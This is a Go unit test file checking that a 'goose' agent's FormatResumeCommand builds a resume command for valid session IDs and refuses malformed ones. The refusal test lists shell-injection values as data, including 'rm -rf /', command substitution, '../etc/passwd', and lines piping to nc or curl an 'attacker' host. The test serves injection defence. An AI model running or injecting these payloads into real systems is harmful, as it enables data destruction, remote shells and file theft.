package goose

import (
	"testing"
)

func TestFormatResumeCommandValidID(t *testing.T) {
	agent := New()
	for _, id := range []string{
		"20260611_1",
		"20260816_42",
		"session.01",
		"abc_DEF-0",
	} {
		got := agent.FormatResumeCommand(id)
		want := "goose session --resume --session-id " + id
		if got != want {
			t.Fatalf("FormatResumeCommand(%q) = %q, want %q", id, got, want)
		}
	}
}

func TestFormatResumeCommandRefusesInvalidPayloads(t *testing.T) {
	agent := New()
	for _, id := range []string{
		"",
		`evil; rm -rf /`,
		`evil$(whoami)`,
		"evil`id`",
		"evil\nrm -rf /",
		"../etc/passwd",
		"~/evil",
		"evil|nc attacker 4444",
		"evil && curl attacker",
		"\x1b[31mansi\x1b[0m",
		"evil ",
		" evil",
	} {
		if got := agent.FormatResumeCommand(id); got != "" {
			t.Fatalf("FormatResumeCommand(%q) = %q, want empty (refused)", id, got)
		}
	}
}
